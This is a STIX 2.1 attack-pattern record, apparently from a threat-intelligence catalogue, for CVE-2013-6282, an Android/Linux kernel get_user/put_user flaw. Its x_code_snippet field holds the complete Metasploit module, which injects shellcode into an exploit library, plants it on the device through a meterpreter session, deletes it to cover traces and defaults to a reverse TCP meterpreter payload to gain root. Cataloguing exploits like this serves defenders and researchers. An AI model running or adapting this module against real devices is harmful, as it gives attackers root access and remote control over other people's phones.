{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1c8f25b6-db9d-4bb1-ace8-bea592e31840",
    "created": "2024-08-14T16:35:10.761457Z",
    "modified": "2024-08-14T16:35:10.761461Z",
    "name": "\"Android get_user/put_user Exploit\"",
    "description": " This module exploits a missing check in the get_user and put_user API functions in the linux kernel before 3.5.5. The missing checks on these functions allow an unprivileged user to read and write kernel memory. This exploit first reads the kernel memory to identify the commit_creds and ptmx_fops address, then uses the write primitive to execute shellcode as uid 0. The exploit was first discovered in the wild in the vroot rooting application.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/android/local/put_user_vroot.rb",
            "external_id": "put_user_vroot.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-6282"
        },
        {
            "source_name": "reference",
            "url": "https://forum.xda-developers.com/t/root-share-vroot-1-6-0-3690-1-click-root-method-lenovo-a706-walkman-f800-etc.2434453/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/fi01/libget_user_exploit"
        },
        {
            "source_name": "reference",
            "url": "https://forum.xda-developers.com/t/root-saferoot-root-for-vruemj7-mk2-and-android-4-3.2565758/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Common\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => \"Android get_user/put_user Exploit\",\n          'Description' => %q{\n            This module exploits a missing check in the get_user and put_user API functions\n            in the linux kernel before 3.5.5. The missing checks on these functions\n            allow an unprivileged user to read and write kernel memory.\n            This exploit first reads the kernel memory to identify the commit_creds and\n            ptmx_fops address, then uses the write primitive to execute shellcode as uid 0.\n            The exploit was first discovered in the wild in the vroot rooting application.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'fi01', # libget_user_exploit / libput_user_exploit\n            'cubeundcube', # kallsyms_in_memory\n            'timwr',       # Metasploit module\n          ],\n          'References' => [\n            [ 'CVE', '2013-6282' ],\n            [ 'URL', 'https://forum.xda-developers.com/t/root-share-vroot-1-6-0-3690-1-click-root-method-lenovo-a706-walkman-f800-etc.2434453/' ],\n            [ 'URL', 'https://github.com/fi01/libget_user_exploit' ],\n            [ 'URL', 'https://forum.xda-developers.com/t/root-saferoot-root-for-vruemj7-mk2-and-android-4-3.2565758/' ],\n          ],\n          'DisclosureDate' => '2013-09-06',\n          'SessionTypes' => [ 'meterpreter' ],\n          \"Platform\" => [ \"android\", \"linux\" ],\n          'Targets' => [[ 'Automatic', {}]],\n          'Payload' => { 'Space' => 2048, },\n          'DefaultOptions' => {\n            'WfsDelay' => 120,\n            'PAYLOAD' => 'linux/armle/meterpreter/reverse_tcp',\n          },\n          'DefaultTarget' => 0,\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                core_loadlib\n                stdapi_fs_delete_file\n                stdapi_fs_getwd\n              ]\n            }\n          },\n        }\n      )\n    )\n  end\n\n  def exploit\n    local_file = File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2013-6282.so\")\n    exploit_data = File.read(local_file, mode: 'rb')\n\n    space = payload_space\n    payload_encoded = payload.encoded\n\n    # Substitute the exploit shellcode with our own\n    exploit_data.gsub!(\"\\x90\" * 4 + \"\\x00\" * (space - 4), payload_encoded + \"\\x90\" * (payload_encoded.length - space))\n\n    workingdir = session.fs.dir.getwd\n    remote_file = \"#{workingdir}/#{Rex::Text::rand_text_alpha_lower(5)}\"\n    write_file(remote_file, exploit_data)\n\n    print_status(\"Loading exploit library #{remote_file}\")\n    session.core.load_library(\n      'LibraryFilePath' => local_file,\n      'TargetFilePath' => remote_file,\n      'UploadLibrary' => false,\n      'Extension' => false,\n      'SaveToDisk' => false\n    )\n    print_status(\"Loaded library #{remote_file}, deleting\")\n    session.fs.file.rm(remote_file)\n    print_status(\"Waiting #{datastore['WfsDelay']} seconds for payload\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-09-06"
}